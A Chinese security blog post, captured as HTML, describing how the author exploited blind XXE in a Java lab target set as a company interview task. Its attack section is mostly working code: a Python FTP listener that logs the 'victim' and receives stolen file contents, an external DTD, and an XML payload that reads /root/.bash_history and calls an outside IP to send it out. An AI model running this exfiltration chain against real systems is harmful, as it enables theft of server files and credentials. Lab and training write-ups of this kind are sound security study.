@@ -1,0 +1,218 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>一个公司的面试题目-靶场 | Rick</title><meta name="author" content="LYC"><meta name="copyright" content="LYC"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="投简历后,公司下发的靶场 要求60小时内做完(不是我投的简历),简单记录一下过程 扫一遍端口和目录,目录发现admin目录,抓包会看到xml形式传递数据,看看能不能xxe. 经过简单的测试发现可以盲打xxe,而且根据服务器接受的信息来看,靶场是java的.php协议不能用,无法将数据编码传输,所以http传输不能用.用ftp传输即可 这里用ftp:&#x2F;&#x2F;ip&#x2F;data  来访问ftp服务器其实是没有">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一个公司的面试题目-靶场">
+<meta property="og:url" content="http://991688344.github.io/2020/04/17/%E4%B8%80%E4%B8%AA%E5%85%AC%E5%8F%B8%E7%9A%84%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE-%E9%9D%B6%E5%9C%BA/index.html">
+<meta property="og:site_name" content="Rick">
+<meta property="og:description" content="投简历后,公司下发的靶场 要求60小时内做完(不是我投的简历),简单记录一下过程 扫一遍端口和目录,目录发现admin目录,抓包会看到xml形式传递数据,看看能不能xxe. 经过简单的测试发现可以盲打xxe,而且根据服务器接受的信息来看,靶场是java的.php协议不能用,无法将数据编码传输,所以http传输不能用.用ftp传输即可 这里用ftp:&#x2F;&#x2F;ip&#x2F;data  来访问ftp服务器其实是没有">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://991688344.github.io/images/Wallpaper/rainbowcat.gif">
+<meta property="article:published_time" content="2020-04-16T21:37:49.000Z">
+<meta property="article:modified_time" content="2024-03-19T01:32:36.450Z">
+<meta property="article:author" content="LYC">
+<meta property="article:tag" content="安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://991688344.github.io/images/Wallpaper/rainbowcat.gif"><link rel="shortcut icon" href="/images/Wallpaper/favicon.ico"><link rel="canonical" href="http://991688344.github.io/2020/04/17/%E4%B8%80%E4%B8%AA%E5%85%AC%E5%8F%B8%E7%9A%84%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE-%E9%9D%B6%E5%9C%BA/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/content.json","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '一个公司的面试题目-靶场',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  isShuoshuo: false
+}</script><link rel="stylesheet" href="/mycss/my_background.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-color: #F7F9FE;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">251</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">37</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">49</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/images/Wallpaper/rainbowcat.gif);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Rick</span></a><a class="nav-page-title" href="/"><span class="site-name">一个公司的面试题目-靶场</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">一个公司的面试题目-靶场</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-04-16T21:37:49.000Z" title="发表于 2020-04-17 05:37:49">2020-04-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-03-19T01:32:36.450Z" title="更新于 2024-03-19 09:32:36">2024-03-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">741</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>3分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>投简历后,公司下发的靶场 要求60小时内做完(不是我投的简历),简单记录一下过程</p>
+<p>扫一遍端口和目录,目录发现admin目录,抓包会看到xml形式传递数据,看看能不能xxe.</p>
+<p>经过简单的测试发现可以盲打xxe,而且根据服务器接受的信息来看,靶场是java的.php协议不能用,无法将数据编码传输,所以http传输不能用.用ftp传输即可</p>
+<p>这里用<a href="ftp://ip/data">ftp://ip/data</a>  来访问ftp服务器其实是没有真正链接上的,所以正常的ftp服务器是不行的.自己搭建一个来接收数据</p>
+<p>先搭建一个ftp服务器</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FTPServer</span>(SocketServer.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        FTP Java handler which can handle reading files</span></span><br><span class="line"><span class="string">        and directories that are being sent by the server.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.request.settimeout(<span class="number">10</span>)</span><br><span class="line">        logger(<span class="string">&quot;[+] victim [&#123;&#125;] has connected FTP !&quot;</span>.<span class="built_in">format</span>(<span class="variable language_">self</span>.client_address[<span class="number">0</span>]), is_print=<span class="literal">True</span>)</span><br><span class="line">        <span class="variable language_">self</span>.request.sendall(<span class="string">&quot;220 ftp-server\n&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="variable language_">self</span>.data = <span class="variable language_">self</span>.request.recv(<span class="number">4096</span>).strip()</span><br><span class="line">                <span class="keyword">if</span> <span class="variable language_">self</span>.data.startswith(<span class="string">&quot;RETR &quot;</span>):</span><br><span class="line">                    logger(<span class="string">&quot;[+] FTP Received File:\n&#123;separator&#125;\n&#123;&#125;\n&#123;separator&#125;&quot;</span>.<span class="built_in">format</span>(<span class="variable language_">self</span>.data.lstrip(<span class="string">&quot;RETR &quot;</span>), separator=<span class="string">&quot;=&quot;</span> * <span class="number">50</span>), is_print=<span class="literal">True</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    in_key = <span class="literal">False</span></span><br><span class="line">                    keys = [<span class="string">&quot;USER&quot;</span>, <span class="string">&quot;PASS&quot;</span>, <span class="string">&quot;TYPE&quot;</span>, <span class="string">&quot;EPRT&quot;</span>, <span class="string">&quot;EPSV&quot;</span>, <span class="string">&quot;QUIT&quot;</span>]</span><br><span class="line">                    <span class="keyword">for</span> key <span class="keyword">in</span> keys:</span><br><span class="line">                        <span class="keyword">if</span> <span class="variable language_">self</span>.data.startswith(key):</span><br><span class="line">                            in_key = <span class="literal">True</span></span><br><span class="line">                            logger(<span class="string">&quot;[+] FTP: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="variable language_">self</span>.data), is_print=<span class="literal">True</span>)</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> in_key:</span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">str</span>(<span class="variable language_">self</span>.data) == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                            logger(<span class="string">&quot;[*] file exists! maybe target cannot send multi-lines file!(jdk&lt;7u141/jdk&lt;8u162 supported)&quot;</span>.<span class="built_in">format</span>(<span class="variable language_">self</span>.data), is_print=<span class="literal">True</span>)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            logger(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="variable language_">self</span>.data[<span class="variable language_">self</span>.data.find(<span class="string">&quot; &quot;</span>)+<span class="number">1</span>:]), is_print=<span class="literal">True</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;LIST&quot;</span> <span class="keyword">in</span> <span class="variable language_">self</span>.data:</span><br><span class="line">                    <span class="variable language_">self</span>.request.sendall(<span class="string">&quot;drwxrwxrwx 1 owner group          1 Feb 21 01:11 rsl\n&quot;</span>)</span><br><span class="line">                    <span class="variable language_">self</span>.request.sendall(<span class="string">&quot;150 Opening BINARY mode data connection for /bin/ls\n&quot;</span>)</span><br><span class="line">                    <span class="variable language_">self</span>.request.sendall(<span class="string">&quot;226 Transfer complete.\n&quot;</span>)</span><br><span class="line">                <span class="keyword">elif</span> <span class="string">&quot;USER&quot;</span> <span class="keyword">in</span> <span class="variable language_">self</span>.data:</span><br><span class="line">                    <span class="variable language_">self</span>.request.sendall(<span class="string">&quot;331 password please - version check\n&quot;</span>)</span><br><span class="line">                <span class="keyword">elif</span> <span class="string">&quot;PORT&quot;</span> <span class="keyword">in</span> <span class="variable language_">self</span>.data:</span><br><span class="line">                    logger(<span class="string">&quot;[+] FTP PORT received&quot;</span>)</span><br><span class="line">                    logger(<span class="string">&quot;[+] FTP &gt; 200 PORT command ok&quot;</span>)</span><br><span class="line">                    <span class="variable language_">self</span>.request.sendall(<span class="string">&quot;200 PORT command ok\n&quot;</span>)</span><br><span class="line">                <span class="keyword">elif</span> <span class="string">&quot;SYST&quot;</span> <span class="keyword">in</span> <span class="variable language_">self</span>.data:</span><br><span class="line">                    <span class="variable language_">self</span>.request.sendall(<span class="string">&quot;215 RSL\n&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    logger(<span class="string">&quot;[+] FTP &gt; 230 more data please!&quot;</span>)</span><br><span class="line">                    <span class="variable language_">self</span>.request.sendall(<span class="string">&quot;230 more data please!\n&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;timed out&quot;</span> <span class="keyword">in</span> e:</span><br><span class="line">                logger(<span class="string">&quot;[*] FTP Client timed out&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                logger(<span class="string">&quot;[-] FTP Client error: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e), is_print=<span class="literal">True</span>)</span><br><span class="line">        logger(<span class="string">&quot;[*] FTP Connection closed with &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="variable language_">self</span>.client_address[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_server</span>(<span class="params">conn, serv_class</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        server = SocketServer.TCPServer(conn, serv_class)</span><br><span class="line">        t = Thread(target=server.serve_forever)</span><br><span class="line">        t.daemon = <span class="literal">True</span></span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;[Errno 10048]&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(e):</span><br><span class="line">            exit(<span class="string">&quot;[-] Port [&#123;&#125;] is already in use&quot;</span>.<span class="built_in">format</span>(conn[<span class="number">1</span>]))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            exit(<span class="built_in">str</span>(e))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><code>python ./xxeftp 2121</code>启动</p>
+<p>服务器上的secret.dtd</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % hacker &quot;&lt;!ENTITY send SYSTEM &#x27;ftp://服务器ip地址:2121/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%hacker;</span><br></pre></td></tr></table></figure>
+<p>发送的payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///root/.bash_history&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://39.98.35.144:80/secret.dtd&quot;&gt; </span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;reg&gt;&lt;name&gt;admin&lt;/name&gt;&lt;tel&gt;&amp;send;&lt;/tel&gt;&lt;email&gt;111111111@qq.com&lt;/email&gt;&lt;/reg&gt;&lt;/root&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>file:// 是可以遍历目录的</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://991688344.github.io">LYC</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://991688344.github.io/2020/04/17/%E4%B8%80%E4%B8%AA%E5%85%AC%E5%8F%B8%E7%9A%84%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE-%E9%9D%B6%E5%9C%BA/">http://991688344.github.io/2020/04/17/%E4%B8%80%E4%B8%AA%E5%85%AC%E5%8F%B8%E7%9A%84%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE-%E9%9D%B6%E5%9C%BA/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://991688344.github.io" target="_blank">Rick</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AE%89%E5%85%A8/">安全</a></div><div class="post-share"><div class="social-share" data-image="/images/Wallpaper/rainbowcat.gif" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2020/04/19/JS%E5%8E%9F%E5%9E%8B%E5%AF%B9%E8%B1%A1/" title="JS原型对象"><img class="cover" src="/images/Wallpaper/rainbowcat.gif" onerror="onerror=null;src='/images/404.png'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">JS原型对象</div></div><div class="info-2"><div class="info-item-1">一、什么是原型  原型是Javascript中的继承的基础，JavaScript的继承就是基于原型的继承。 JavaScript 常被描述为一种基于原型的语言 (prototype-based language)——每个对象拥有一个原型对象，对象以其原型为模板、从原型继承方法和属性。原型对象也可能拥有原型，并从中继承方法和属性，一层一层、以此类推。这种关系常被称为原型链 (prototype chain)，它解释了为何一个对象会拥有定义在其他对象中的属性和方法。 准确地说，这些属性和方法定义在Object的构造器函数(constructor functions)之上的prototype属性上，而非对象实例本身。 在传统的 OOP 中，首先定义“类”，此后创建对象实例时，类中定义的所有属性和方法都被复制到实例中。在 JavaScript 中并不如此复制——而是在对象实例和它的构造器之间建立一个链接（它是__proto__属性，是从构造函数的prototype属性派生的），之后通过上溯原型链，在构造器中找到这些属性和方法。 注意:...</div></div></div></a><a class="pagination-related" href="/2020/04/09/Linux%E6%9F%A5%E6%89%BEPDF%E5%86%85%E5%AE%B9/" title="Linux查找PDF内容"><img class="cover" src="/images/Wallpaper/eatham.gif" onerror="onerror=null;src='/images/404.png'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Linux查找PDF内容</div></div><div class="info-2"><div class="info-item-1">  pdfgrep -R 'a pattern to search recursively from path' /some/path   find /path -name '*.pdf' -exec sh -c 'pdftotext &quot;&#123;&#125;&quot; - | grep --with-filename --label=&quot;&#123;&#125;&quot; --color &quot;your pattern&quot;' \; “ - ”是将pdftotext输出到stdout而不是文件的必要条件。pdftotext和grep选项将文件名放在grep的输出中。可选的pdfgrep标志很好，告诉grep使用终端上的颜色输出。 （在Ubuntu中，pdftotext由包grep或pdfgrep提供。）    https://www.itranslater.com/qa/details/2119607760756147200 </div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2020/03/27/CORS%E4%B8%8Ejsonp/" title="CORS与jsonp"><img class="cover" src="/images/Wallpaper/rainbowcat.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-03-27</div><div class="info-item-2">CORS与jsonp</div></div><div class="info-2"><div class="info-item-1">https://juejin.im/post/5cb5c40ff265da03a158210e </div></div></div></a><a class="pagination-related" href="/2020/02/25/CSRF%E6%BC%8F%E6%B4%9E/" title="CSRF漏洞"><img class="cover" src="/images/Wallpaper/rainbowcat.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-02-25</div><div class="info-item-2">CSRF漏洞</div></div><div class="info-2"><div class="info-item-1">什么是CSRF ​      CSRF（Cross-site request forgery）跨站请求伪造，也被称为“one click attack”或者session riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。CSRF通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。 ​ ​      下图是一次完整的CSRF攻击示意图。用户登录并访问了一正常网站，登录成功后，网站返回用户的身份标识Cookie给用户。当用户访问到恶意网站时，恶意网站强制用户去向正常网站发送恶意请求。由于用户此时拥有正常网站的Cookie，所以就相当于攻击者盗用了用户身份，去访问了正常（目标）网站。 一次完整的CSRF攻击，需要受害用户需要完成两个步骤： ​       1.登录正常网站，并在本地生成Cookie。 ​ ​       2.在不退出正常网站的情况下，访问恶意网站。  CSRF 背景与介绍 CSRF（Cross Site Request...</div></div></div></a><a class="pagination-related" href="/2020/05/07/CTF%E4%B8%AD%E7%9A%84htaccess/" title="CTF中的htaccess"><img class="cover" src="/images/Wallpaper/eatham.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-05-07</div><div class="info-item-2">CTF中的htaccess</div></div><div class="info-2"><div class="info-item-1">服务器中间件为apache，因此想到了传.htaceess来解析php，通常我们用 .htaccess来解析非php后缀文件时用到 AddType application/x-httpd-php .ppp 或者 123&lt;FilesMatch &quot;shell.jpg&quot;&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt; auto_append_file和auto_prepend_file 相关bypass 如果文件末尾被自动加上一句话,会导致服务器500错误,这时候可以在最后添加#\ 将换行转义成普通字符 如果特殊字符被实体编码, 可以通过特殊编码来绕过   相关比赛 XNUCA2019Qualifier </div></div></div></a><a class="pagination-related" href="/2022/05/18/CVE-2019-12422_Shiro_Remember%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="CVE-2020-17523_Apache_Shiro身份认证绕过"><img class="cover" src="/images/Wallpaper/rainbowcat.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-05-18</div><div class="info-item-2">CVE-2020-17523_Apache_Shiro身份认证绕过</div></div><div class="info-2"><div class="info-item-1">CVE-2019-12422 漏洞描述 Shiro RememberMe 反序列化漏洞 漏洞成因 由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding  Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。 shiro对于Cookie处理做了如下实现： 123456789101112131415161718192021222324252627282930protected byte[] decrypt(byte[] encrypted) &#123;	byte[] serialized = encrypted;	CipherService cipherService = getCipherService();	if (cipherService != null) &#123;		ByteSource byteSource = cipherService.decrypt(encrypted,...</div></div></div></a><a class="pagination-related" href="/2022/05/18/CVE-2020-17523_Apache_Shiro%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87/" title="CVE-2020-17523_Apache_Shiro身份认证绕过"><img class="cover" src="/images/Wallpaper/eatham.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-05-18</div><div class="info-item-2">CVE-2020-17523_Apache_Shiro身份认证绕过</div></div><div class="info-2"><div class="info-item-1">CVE-2020-17523 漏洞描述 Apache Shiro身份认证绕过漏洞 漏洞成因 Shiro中对于URL的获取及匹配在org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain 先看下这个getChain方法： 12345678910111213141516171819202122232425262728293031323334353637public FilterChain getChain(ServletRequest request, ServletResponse response, FilterChain originalChain) &#123;        FilterChainManager filterChainManager = getFilterChainManager();        if (!filterChainManager.hasChains()) &#123;            return null;        &#125;     ...</div></div></div></a><a class="pagination-related" href="/2022/04/26/Cobalt-Strike%E4%BD%BF%E7%94%A8/" title="Cobalt Strike使用"><img class="cover" src="/2022/04/26/Cobalt-Strike%E4%BD%BF%E7%94%A8/cover.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i 